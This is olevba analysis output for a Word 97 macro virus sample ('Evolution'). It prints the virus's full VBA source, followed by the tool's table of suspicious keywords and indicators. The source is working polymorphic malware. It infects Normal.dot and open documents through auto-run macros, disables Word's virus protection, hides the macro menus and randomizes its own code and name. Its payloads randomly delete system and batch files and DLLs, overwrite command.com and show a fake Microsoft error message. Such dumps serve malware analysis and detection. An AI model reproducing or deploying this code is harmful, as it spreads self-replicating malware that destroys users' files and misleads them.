olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-4ee63fd3de73126b2facbfd4ded5ccab2713baec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-4ee63fd3de73126b2facbfd4ded5ccab2713baec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EVOL.bas 
in file: Virus.MSWord.Evolution.c-4ee63fd3de73126b2facbfd4ded5ccab2713baec - OLE stream: 'Macros/VBA/EVOL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
Public ByeMacro As String
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public PMExport As String
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public FileID2 As String
Public Virname As String
Public FC_There As Boolean
Public FO_There As Boolean
Public FP_There As Boolean
Public FN_There As Boolean
Public FS_There As Boolean
Public FSA_There As Boolean
Public VrusName As String
Public Armor As Boolean
Function Self_Recognition()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\vnames.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
doccheck:
Close #1
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function Armor_Status()
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Export_Code()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
Morph:
Randomize Timer
q = Int(Rnd(1) * 5) + 1
For vi = 1 To q
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.2 Export File ID Morph
Open "C:\windows\system\Export.sys" For Append As #1
Print #1, FileID
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID
Close #1
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Polymorphic_Check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID2 For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
Loop Until EOF(1)
End Function
Function Payload()
On Error Resume Next
'Now we got a nasty little payload....
Check$ = Dir("C:\error1.sys")
If Check$ = "error1.sys" Then Exit Function
Randomize Timer
x = Int(Rnd(1) * 100)
If x = 1 Then
Open "C:\autoexec.bat" For Append As #1
Print #1, "echo Everything must change"
Close #1
End If
If x = 2 Then
Open "C:\command.com" For Output As #1
Print #1, "W97M/Evolution .b!!"
Close #1
End If
If x = 3 Then
Kill "C:\*.sys"
Kill "C:\*.bat"
End If
If x = 50 Then
Kill "C:\windows\system\*.dll"
End If
If x = 25 Then
Open "C:\windows\Control.ini" For Append As #1
Seek #1, 0
Print #1, "[Screen Saver.3DText]"
Print #1, "DemoType = 0"
Print #1, "RotStyle = 3"
Print #1, "Tesselation = 100"
Print #1, "Size = 100"
Print #1, "Speed = 100"
Print #1, "SurfStyle = 0"
Print #1, "Font = Comic Sans MS"
Print #1, "FontAttributes = 0"
Print #1, "Charset = 0"
Print #1, "Text = Evolution"
Print #1, "Texture = None"
Print #1, "TextureFileOffset = 3"
Close #1
End If
If x = 75 Then
' I love this nice little trick for Dr. Solomon
Open "C:\windows\import.exe" For Append As #1
Print #1, "ZQZXJVBVT"
Print #1, "Oops looks like you got a 'virus'"
Close #1
End If
If x = 69 Then
Open "C:\windows\Evolution.bmp" For Append As #1
Print #1, "dedicated to that special little someone.."
Print #1, "She knows who she is..."
Close #1
End If
If x = 83 Then
Open "C:\windows\system\data101.cpl" For Append As #1
Print #1, "Word97 Macro Evolution .b"
Close #1
End If
End Function
Function Evolve()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
'RAPE v1.2 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
PM = Int(Rnd(1) * 150) + 1
If PM = 22 Then
If FC_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call Evolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Evolution"
Print #1, "End sub"
Close #1
End If
If PM = 122 Then
If FN_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
Print #1, "End Sub"
Close #1
End If
If PM = 90 Then
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 8 Then
If FSA_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function Norminf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\vnames.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
Function FileInft()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
End With
Randomize Timer
WD = Int(Rnd(1) * 8) + 2
For evo = 2 To WD
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
VrusName = VrusName + a$
Next evo
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
' RAPE v1.2 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
End Function
Function Evolution()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
Call Armor_Status
Call Export_Code
Call Payload
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
If FileInf = False Then Call FileInft
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
' W97M/Evolution
' W97M/Evolution .b Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error
' RAPE v1.2 does:
' Randomly Morphs Source Code by Adding Random Remarks now even better
' Randomly Selects Source Code Export File - Then Morphs it
' Randomly Creates Virus Macro Name
' Randomly Adds 1 to 6 Commands to Code
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
WordBasic.filesave
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Armor_Status
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Sub
Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
If PMFile_Yes = True Then Exit Sub
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
Print #1, "W97M/Evolution .b by Nex"
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error"
Close #1
Open "C:\windows\system\Export.sys" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
F = Int(Rnd(1) * 999) + 1
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID2 For Append As #4
Do
inpux:
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
    If t = 2 Then Z$ = " '" & Application.UserInitials
    If t = 3 Then Z$ = " '" & Application.UserAddress
    If t = 4 Then Z$ = " '" & Int(Rnd(1) * 9999999) + 1
    If t = 5 Then GoTo inpux
    Print #4, Z$
' Source Code Morpher - adds random remarks to Code (RAPE v1.2 by Error)
Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
Print #5, FileID2
Close #5
End Sub
Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
End Sub
' "The most polymorphic Macro Virus to date...." - NAI
' EOF

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |import.exe          |Executable file name                         |
|IOC       |data101.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

